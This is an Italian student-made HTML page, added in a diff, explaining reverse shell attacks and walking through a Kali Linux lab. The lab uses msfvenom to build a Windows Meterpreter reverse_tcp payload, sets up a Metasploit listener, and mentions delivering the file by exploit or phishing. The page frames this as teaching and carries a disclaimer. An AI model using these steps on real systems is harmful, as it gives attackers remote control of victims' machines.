@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Reverse Shell Attack</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark fixed-top">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="index.html">Socket</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item"><a class="nav-link" href="index.html">Home</a></li>
+                    <li class="nav-item"><a class="nav-link" href="socket.html">Cos'è una Socket?</a></li>
+                    <li class="nav-item"><a class="nav-link" href="osi.html">Modello OSI</a></li>
+                    <li class="nav-item"><a class="nav-link" href="tcp.html">TCP vs UDP</a></li>
+                    <li class="nav-item"><a class="nav-link" href="shell.html">Reverse Shell</a></li>
+                    <li class="nav-item"><a class="nav-link" href="glossario.html">Glossario</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+   <!-- Corpo principale -->
+
+   <div class="container my-5">
+    <!-- Titolo principale -->
+    <div class="text-center mb-4">
+        <h1 style="color: rgb(185, 0, 0);">Attacco Reverse Shell</h1>
+        <p class="text-light">Esplora i dettagli di un attacco reverse shell e scopri come realizzarne uno in un ambiente di laboratorio controllato.</p>
+    </div>
+
+    <!-- Sezione spiegazione -->
+    <div class="row g-4">
+        <div class="col-12">
+            <div class="card text-light bg-dark">
+                <div class="card-header text-warning">
+                    Cos'è un Reverse Shell?
+                </div>
+                <div class="card-body">
+                    <p>
+                        Una <b>reverse shell</b> è un tipo di attacco che consente a un aggressore di ottenere accesso remoto a un sistema vulnerabile. 
+                        L'attacco si basa sull'uso delle <b>socket</b>, un'interfaccia di comunicazione che permette il trasferimento di dati tra due macchine. 
+                        La particolarità della reverse shell è che è la macchina vittima a stabilire la connessione verso l'aggressore, bypassando 
+                        spesso le restrizioni del firewall o NAT.
+                    </p>
+                    <h5 class="card-title">Come funziona?</h5>
+                    <ul>
+                        <li>Un aggressore configura un server di ascolto (listener) sulla propria macchina, in attesa di connessioni in entrata.</li>
+                        <li>La vittima esegue un <a href="glossario.html" style="text-decoration: none;" class="text-warning">payload</a> malevolo (spesso tramite exploit o file infetto), che apre una connessione verso il listener dell'attaccante.</li>
+                        <li>L'attaccante ottiene una shell remota sulla macchina vittima, consentendo l'esecuzione di comandi con i privilegi della vittima.</li>
+                    </ul>
+                    <h5 class="card-title">Perché le socket sono fondamentali?</h5>
+                    <p>
+                        Le socket sono il cuore della comunicazione client-server. In un attacco reverse shell:
+                        <ul>
+                            <li>La <b>socket client</b> (vittima) stabilisce la connessione con la <b>socket server</b> (attaccante).</li>
+                            <li>Una volta stabilita, i dati (comandi e output) fluiscono attraverso questa connessione bidirezionale.</li>
+                        </ul>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Sezione laboratorio -->
+    <div class="row mt-5">
+        <div class="col-12">
+            <div class="card text-light bg-dark">
+                <div class="card-header text-warning">
+                    Laboratorio: Esecuzione di un attacco Reverse Shell con Kali Linux
+                </div>
+                <div class="card-body">
+                    <h5 class="card-title">Preparativi</h5>
+                    <ol>
+                        <li>Assicurati di avere <b>Kali Linux</b> installato e funzionante.</li>
+                        <li>Verifica di avere <b><a href="glossario.html" style="text-decoration: none;" class="text-warning">Msf(Metasploit framework)</a></b> e <b><a href="glossario.html" style="text-decoration: none;" class="text-warning">msfvenom</a></b> configurati correttamente.</li>
+                        <li>Imposta un ambiente di laboratorio controllato (ad esempio una macchina virtuale come vittima).</li>
+                    </ol>
+
+                    <h5 class="card-title">Passaggi</h5>
+                    <ol>
+                        <li><strong>Creazione del payload con msfvenom</strong></li>
+                        <pre class="bg-dark text-light p-3">
+                            # Genera un payload per Windows con msfvenom:
+                            msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f exe -o shell.exe
+                            # Su LHOST completa con l'IP della macchina Kali(attaccante) e completa LPORT con la porta da utilizzare.
+                        </pre>
+                        <li><strong>Avvio del listener su Metasploit</strong></li>
+                        <pre class="bg-dark text-light p-3">
+                            # Avvia Metasploit:
+                            msfconsole
+                            # Configura il listener:
+                            use exploit/multi/handler
+                            set payload windows/meterpreter/reverse_tcp
+                            set LHOST <tuo_IP>
+                            set LPORT <porta>
+                            exploit
+                        </pre>
+                        <li><strong>Esecuzione del payload sulla macchina vittima</strong></li>
+                        <p>
+                            Trasferisci il file `shell.exe` sulla macchina vittima (tramite exploit, phishing o altri metodi controllati). Quando il file viene eseguito:
+                            <ul>
+                                <li>La macchina vittima stabilisce una connessione con il listener Metasploit sulla macchina attaccante.</li>
+                                <li>Si apre una shell Meterpreter che consente all'attaccante di controllare il sistema remoto.</li>
+                            </ul>
+                        </p>
+                        <li><strong>Test delle funzionalità</strong></li>
+                        <p>
+                            Una volta connesso, prova comandi come:
+                            <pre class="bg-dark text-light p-3">
+                                sysinfo  # Mostra le informazioni di sistema della vittima
+                                getuid   # Mostra l'utente attualmente collegato
+                        </pre>
+                        </p>
+                    </ol>
+
+                    <h5 class="card-title">Nota Importante</h5>
+                    <p style="color: red;">
+                        Questo laboratorio è esclusivamente a scopo didattico. Utilizzalo solo in ambienti controllati e con il consenso delle parti coinvolte. 
+                        Qualsiasi utilizzo non autorizzato è illegale e contrario all'etica informatica.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<div class="container mt-4 mb-5">
+    <hr class="my-5" style="border-top: 2px solid #ccc;">
+    <h2 class="text-center mt-4">Scopri Anche</h2>
+</div>
+
+   <!-- Sezione delle card -->
+<div class="container mt-4 mb-5">
+    <!-- Separatore orizzontale -->
+    <hr class="my-5" style="border-top: 2px solid #ccc;">
+    <div class="row">
+      <!-- Prima card Socket-->
+      <div class="col-md-3 mb-3">
+        <div class="card bg-dark text-white" style="width: 100%;">
+          <img class="card-img-top" src="imgs/trasferimento.jpg" alt="Socket">
+          <div class="card-body">
+            <h5 class="card-title">SOCKET</h5>
+            <p class="card-text">Approfondisci il mondo delle socket con questa breve spiegazione, e comprendi piu a fondo le socket </p>
+            <a href="socket.html" class="btn btn-primary">Socket</a>
+          </div>
+        </div>
+      </div>
+  
+      <!-- Seconda card OSI-->
+      <div class="col-md-3 mb-3">
+        <div class="card bg-dark text-white" style="width: 100%;">
+          <img class="card-img-top" src="imgs/osi.jpg" alt="Iso/osi">
+          <div class="card-body">
+            <h5 class="card-title">PILA ISO/OSI</h5>
+            <p class="card-text">Scopri come funzionano le comunicazioni, partendo dal livello piu basso fino ad arrivare all'utente finale</p>
+            <a href="osi.html" class="btn btn-primary">Modello Iso/Osi</a>
+          </div>
+        </div>
+      </div>
+  
+      <!-- Terza card TCP-->
+      <div class="col-md-3 mb-3">
+        <div class="card bg-dark text-white" style="width: 100%;">
+          <img class="card-img-top" src="imgs/tcp-udp.png" alt="tcp/udp">
+          <div class="card-body">
+            <h5 class="card-title">TCP/UDP</h5>
+            <p class="card-text">Immergiti ancora piu in profondita e impara quello che sta alla base dei protocolli tcp e udp</p>
+            <a href="tcp.html" class="btn btn-primary">Tcp / Udp</a>
+          </div>
+        </div>
+      </div>
+
+      <!--quarta card reverse shell-->
+      <div class="col-md-3 mb-3">
+        <div class="card bg-dark text-white" style="width: 100%;">
+          <img class="card-img-top" src="imgs/security.png" alt="reverseShell">
+          <div class="card-body">
+            <h5 class="card-title">REVERSE SHELL</h5>
+            <p class="card-text">Impara come le socket possono essere usate anche nel penetration testing</p>
+            <a href="shell.html" class="btn btn-primary">Reverse Shell</a>
+          </div>
+        </div>
+      </div>
+
+
+
+
+    </div>
+</div>
+
+
+<!-- Footer-->
+<footer class="bg-dark text-white text-center py-3">
+    <div>
+        <p>Formaggio Angelo, 5^F</p>
+    </div>
+    <div>
+        <li>
+            <a href="#">angelo.formaggio@iisviolamarchesini.edu.it</a>
+        </li>
+        <li>
+            <a href="https://github.com/AngeloFormaggio">GitHub</a>
+        </li>
+    </div>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
